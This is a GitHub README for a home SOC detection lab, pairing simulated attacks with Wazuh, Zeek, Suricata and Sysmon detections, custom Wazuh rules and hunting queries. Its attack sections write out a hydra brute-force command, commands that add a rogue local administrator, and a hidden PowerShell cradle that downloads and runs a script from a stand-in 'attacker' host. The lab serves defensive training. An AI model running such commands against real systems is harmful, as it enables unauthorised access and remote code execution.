# 🛡️ **Home SOC Lab – Advanced Detection Engineering Playground**

### **Wazuh SIEM • Zeek NSM • Suricata IDS/IPS • Sysmon EDR • Windows 10 • Kali Linux**

This project is a **complete, isolated SOC environment** built on VMware, designed to demonstrate:

👉 **SOC analysis skills**

👉 **Log analysis + correlation (SIEM)**

👉 **Endpoint telemetry investigation (EDR)**

👉 **Network security monitoring (IDS/IPS)**

👉 **Threat hunting**

👉 **Detection engineering (custom Wazuh rules)**

👉 **Attack simulation / Red-vs-Blue workflows**

---

## 🚀 **Purpose of This Lab**

This repository demonstrates **hands-on blue-team capability** by simulating attacker behaviour and detecting it using:

* **Wazuh SIEM (Log analytics + custom correlation rules)**
* **Sysmon EDR telemetry**
* **Zeek (Network Security Monitoring)**
* **Suricata IDS/IPS (Deep packet inspection + signatures)**


✔ Real-world SOC analyst capability
✔ Familiarity with SIEM + EDR investigations
✔ Ability to write **custom detection rules**
✔ Experience with IDS/IPS tooling
✔ Skill in documenting and analyzing attacks
✔ Understanding of MITRE ATT&CK

---

# 📁 **Repository Structure**

```
home-soc-lab/
│
├── README.md
│
├── docs/
│   ├── architecture.drawio
│   ├── architecture.png
│   └── detection-flow.png
│
├── configs/
│   ├── wazuh/
│   │   ├── local_rules.xml
│   │   └── fim_config.xml
│   ├── zeek/
│   │   ├── node.cfg
│   │   ├── networks.cfg
│   │   └── local.zeek
│   ├── suricata/
│   │   └── suricata.yaml
│   └── sysmon/
│       └── sysmon.xml
│
├── scenarios/
│   ├── 01_port_scan_recon.md
│   ├── 02_bruteforce_wazuh_rule.md
│   ├── 03_eicar_malware_simulation.md
│   ├── 04_fim_sensitive_folder.md
│   ├── 05_privilege_escalation_detection.md
│   └── 06_malicious_powershell.md
│
└── hunting/
    ├── wazuh_queries.md
    ├── zeek_hunting.md
    └── suricata_alerts.md
```

---

# 🧱 **Architecture Overview**

### 🕸️ **Network Segmentation**

| Network        | Purpose                              | CIDR            |
| -------------- | ------------------------------------ | --------------- |
| **SOC_NET**    | Monitoring, SIEM, EDR data ingestion | `10.10.10.0/24` |
| **ATTACK_NET** | Isolated attacker network            | `10.20.20.0/24` |

### 🖥️ **Virtual Machines**

| VM                    | Role                 | IPs                           | Notes                         |
| --------------------- | -------------------- | ----------------------------- | ----------------------------- |
| **SOC VM (Ubuntu)**   | SIEM + IDS/IPS + NSM | `10.10.10.10`                 | Wazuh Manager, Suricata, Zeek |
| **Windows 10 Victim** | Endpoint (EDR)       | `10.10.10.20` + `10.20.20.20` | Sysmon + Wazuh Agent          |
| **Kali Attacker**     | Red-team simulator   | `10.20.20.10`                 | Nmap, Hydra, Metasploit, etc  |

### 🧩 **Security Tools**

| Tool                         | Category    | Purpose                             |
| ---------------------------- | ----------- | ----------------------------------- |
| **Wazuh**                    | SIEM / XDR  | Log correlation, alerts, compliance |
| **Sysmon**                   | EDR         | Endpoint event telemetry            |
| **Zeek**                     | NSM         | Behavioral network metadata         |
| **Suricata**                 | IDS/IPS     | Signature-based detection           |
| **Winlogbeat / Wazuh Agent** | Log shipper | Windows log forwarding              |

---

# 🔥 **Attack Scenarios (Red Team)**

Each scenario includes **attack steps**, **expected telemetry**, and **SOC-side detection**.

---

## 1️⃣ **Reconnaissance – Nmap Port Scan**

**MITRE ATT&CK: TA0043 – Reconnaissance**

🗡️ **Attack**

```bash
nmap -Pn -sS -T4 10.20.20.20
```

📡 **Telemetry Generated**

* Zeek `conn.log`: high connection fan-out
* Suricata: `ET SCAN NMAP` signatures
* Windows logs: connection attempts

🛡️ **Detection**

* Suricata alerts for scanning patterns
* Wazuh correlation rule for high-volume connections
* Zeek metadata analysis to confirm scanning behaviour

---

## 2️⃣ **Brute Force Attack – SMB / RDP Password Guessing**

**MITRE ATT&CK: T1110 – Password Guessing**

🗡️ **Attack**

```bash
hydra -l administrator -P rockyou.txt smb://10.20.20.20
```

📡 **Telemetry**

* Windows Event ID 4625 (Failed logon)
* Sysmon process creation events
* Suricata brute-force rule triggers
* Wazuh parses each authentication failure

🛡️ **Detection (Custom Wazuh Rules)**
✔ Rule 100001 – Single failed login
✔ Rule 100002 – Multiple failures from same IP (correlation)

Recruiters will see **real detection engineering ability**.

---

## 3️⃣ **Malware Simulation – EICAR Antivirus Test File**

**MITRE ATT&CK: T1204 – User Execution**

🗡️ **Attack**

```powershell
echo 'X5O!P%@AP[4\PZX54(P^)7CC)...' > C:\Users\Public\eicar.com
```

📡 **Telemetry**

* Windows Defender event
* Sysmon file creation (Event ID 11)
* Wazuh agent forwards alert

🛡️ **Detection**

* Wazuh built-in AV rules
* Custom rule mapping to MITRE ATT&CK

---

## 4️⃣ **File Integrity Monitoring (FIM) – Sensitive File Modification**

**MITRE ATT&CK: T1565 – Data Manipulation**

🗡️ **Attack**

```powershell
echo "test" > C:\Users\Public\lab-sensitive\data.txt
del C:\Users\Public\lab-sensitive\data.txt
```

📡 **Telemetry**

* Wazuh FIM alerts
* Sysmon Event ID 23/26 (File deleted/modified)

🛡️ **Detection**

* Custom high-severity alert for monitored folder changes

---

## 5️⃣ **Privilege Escalation – New Local Administrator**

**MITRE ATT&CK: T1136 – Account Creation**

🗡️ **Attack**

```powershell
net user attackerLab P@ssw0rd! /add
net localgroup administrators attackerLab /add
```

📡 **Telemetry**

* Event ID 4720 (Account created)
* Event ID 4732 (User added to privileged group)

🛡️ **Detection**

* Wazuh correlation rule
* High-severity admin modification alert

---

## 6️⃣ **Malicious PowerShell Execution**

**MITRE ATT&CK: T1059 – Command and Scripting Interpreter**

🗡️ **Attack**

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

📡 **Telemetry**

* Sysmon Event ID 1: Process creation
* Sysmon Event ID 3: Network connection
* Zeek HTTP request
* Suricata: Powershell exploitation signatures

🛡️ **Detection**

* Wazuh custom rule for suspicious PowerShell flags

---

# 🛡️ **Detection Engineering – Custom Wazuh Rules**

Excerpt from `local_rules.xml`:

```xml
<group name="local,custom_rules,windows,">

  <rule id="100001" level="7">
    <if_sid>5716</if_sid>
    <description>Authentication failure from remote host</description>
    <group>authentication_failed,windows,</group>
  </rule>

  <rule id="100002" level="12">
    <if_matched_sid>5716</if_matched_sid>
    <same_source_ip />
    <description>Brute-force detected: multiple login failures from same IP</description>
    <group>bruteforce,attack,suspicious,</group>
  </rule>

  <rule id="100003" level="10">
    <field name="win.system.eventID">4720</field>
    <description>New Local User Created – Privilege Escalation</description>
    <group>privilege_escalation,windows,</group>
  </rule>

  <rule id="100004" level="12">
    <field name="win.system.eventID">4732</field>
    <description>User Added to Administrators Group</description>
    <group>persistence,privilege_escalation,windows,</group>
  </rule>

</group>
```

These rules demonstrate:

✔ Understanding of Windows Event IDs
✔ Correlation logic
✔ SOC alerting strategy
✔ MITRE mapping

---

# 🔍 **Threat Hunting Queries**

### 🔎 **Wazuh – Failed Logons**

```
rule.id:5716 AND data.win.system.computer:DESKTOP*
```

### 🔎 **Zeek – Scan Detection**

```
# Count connections per source
cat conn.log | zeek-cut id.orig_h | sort | uniq -c | sort -nr
```

### 🔎 **Suricata – Highest-Frequency Alerts**

```
grep "ET SCAN" fast.log
```

---

# 🧩 **Detection Flow Diagram**

Include a PNG image (example):

```
docs/detection-flow.png
```

Diagram should show:

Attacker → Victim → Sysmon → Wazuh Agent → Wazuh SIEM → Alerts

---

# ⭐ **This project demonstrates **real enterprise SOC skills**:**

✔ Endpoint Detection & Response (EDR): Sysmon

✔ Security Information & Event Management (SIEM): Wazuh

✔ Network intrusion detection (IDS/IPS): Suricata

✔ Network behavioral monitoring: Zeek

✔ Custom correlation rules

✔ MITRE ATT&CK-based detection

✔ Documented attack chain

✔ Threat hunting workflow

✔ Blue-team methodology

✔ Practical hands-on knowledge

This repository proves strong capability in:

🟦 **SOC Level 1**: log analysis, alert triage

🟧 **SOC Level 2**: deep investigation, hypothesis-driven hunting

🟥 **SOC Engineering**: detection development & tuning

🟩 **Blue Team**: adversary simulation + defense

---

# 📬 **Contact**

**Angesh Chanderdip**
Cybersecurity Engineer • SOC Analyst • Detection Engineer

🔗 GitHub: [https://github.com/angesh021](https://github.com/angesh021)
